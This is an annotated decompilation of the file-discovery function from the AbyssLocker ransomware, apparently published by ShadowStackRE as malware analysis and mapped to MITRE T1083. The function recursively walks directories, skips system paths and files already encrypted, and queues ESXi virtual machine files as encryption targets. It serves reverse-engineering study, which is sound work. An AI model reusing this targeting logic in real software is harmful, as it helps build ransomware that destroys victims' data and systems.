////////////////////////////////////////////////////////////
// AbyssLocker
// https://www.shadowstackre.com/analysis/AbyssLocker
//
// Technique: Mitre File and Directory Discovery
// URL: https://attack.mitre.org/techniques/T1083/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

unsigned __int64 __fastcall FileDiscoveryVMFiles(const char *location)
{
  struct dirent64 *ptrDirEnt; // rax
  struct stat64 *p_stat_buf; // rdi
  const char *d_name; // rbx
  __int64 i; // rcx
  char *v5; // rdi
  __int64 j; // rcx
  int bitWsStMode; // edx
  __int64 v8; // rbx
  int v9; // r13d
  __int64 v10; // r12
  const char *v11; // rsi
  DIR *dirp; // [rsp+0h] [rbp-10F8h]
  struct timespec abstime; // [rsp+18h] [rbp-10E0h] BYREF
  struct stat64 stat_buf; // [rsp+28h] [rbp-10D0h] BYREF
  char name[4096]; // [rsp+B8h] [rbp-1040h] BYREF
  unsigned __int64 v18; // [rsp+10B8h] [rbp-40h]

  v18 = __readfsqword(0x28u);
  dirp = opendir(location);                     // Open the directory entry at location
  if ( dirp )
  {
LABEL_2:
    while ( 1 )
    {
      ptrDirEnt = readdir64(dirp);              // Get the next directory entry in the list
      if ( !ptrDirEnt )
        break;
      p_stat_buf = &stat_buf;
      d_name = ptrDirEnt->d_name;               // Name of the file
      for ( i = 36LL; i; --i )
      {
        LODWORD(p_stat_buf->st_dev) = 0;
        p_stat_buf = (struct stat64 *)((char *)p_stat_buf + 4);
      }
      if ( strcmp(d_name, ".")                  // Current dir
        && strcmp(d_name, "..")                 // Parent dir
        && !strstr(d_name, ".crypt")            // encrypted file by extension
        && !strstr(d_name, ".README_TO_RESTORE") )// Restore file readme places by the encryptor
      {
        v5 = name;
        for ( j = 1024LL; j; --j )
        {
          *(_DWORD *)v5 = 0;
          v5 += 4;
        }
        // Create a full file path including file name
        strncpy(name, location, 0xFFFuLL);
        if ( ~(strlen(location) + 1) != -3LL )
          __strcat_chk(name, "/", 4096LL);
        __strncat_chk(name, d_name, 4095LL, 4096LL);
        // Get the file stats
        if ( GetFileStats(name, &stat_buf) == -1 )
        {
          if ( logFD )
          {
            abstime.tv_nsec = 0LL;
            abstime.tv_sec = 1LL;
            sem_timedwait(&sem, &abstime);
            __fprintf_chk(logFD, 1LL, "main:%d\n", 510LL);
            fflush(logFD);
            sem_post(&sem);
          }
        }
        else
        {
          bitWsStMode = stat_buf.st_mode & 0xF000;
          if ( bitWsStMode == 0x4000 )          // file is a directory
          {
            v8 = 0LL;
            v9 = 1;
            do
            {
              if ( !strcmp(name, off_216080[v8]) )  // SKip list of linux FS system directories
                v9 = 0;
              ++v8;
            }
            while ( v8 != 21 );
            if ( v9 )
              FileDiscoveryVMFiles(name);       // Recursively call into the directory
          }
          else if ( (stat_buf.st_mode & 0xD000) == 0x8000 || bitWsStMode == 24576 )// Is a regular file
          {
            v10 = 0LL;
            if ( progArgVMDK )
            {
              do
              {
                if ( strstr(d_name, off_216020[v10])    // list of VM file names
                  && !strstr(d_name, ".crypt")
                  && !strstr(d_name, ".tmp_")
                  && !strstr(d_name, ".README_TO_RESTORE")
                  // Get the size of the binary in bytes (From stat buffer)
                  && (unsigned __int64)GetFileStatsTotalSize(name) > 256 )
                {
                  if ( progArgVerbose && logFD )
                  {
                    abstime.tv_nsec = 0LL;
                    abstime.tv_sec = 1LL;
                    sem_timedwait(&sem, &abstime);
                    __fprintf_chk(logFD, 1LL, "Find ESXi:%s\n", name);
                    fflush(logFD);
                    sem_post(&sem);
                  }
                  abstime.tv_sec = (__time_t)strdup(name);
                  sub_48F8((__int64)&qword_216790, &abstime.tv_sec);
                }
                ++v10;
              }
              while ( v10 != 4 );
            }
            else
            {
              while ( 1 )
              {
                v11 = off_216040[v10++];    // List of extension types to skip
                if ( strstr(d_name, v11) )
                  break;
                if ( v10 == 6 )
                {
                  if ( progArgCountFiles < (unsigned __int64)((qword_216798 - qword_216790) >> 3) )
                    goto LABEL_42;
                  abstime.tv_sec = (__time_t)strdup(name);
                  sub_48F8((__int64)&qword_216790, &abstime.tv_sec);
                  goto LABEL_2;
                }
              }
            }
          }
        }
      }
    }
LABEL_42:
    closedir(dirp);
  }
  return __readfsqword(0x28u) ^ v18;
}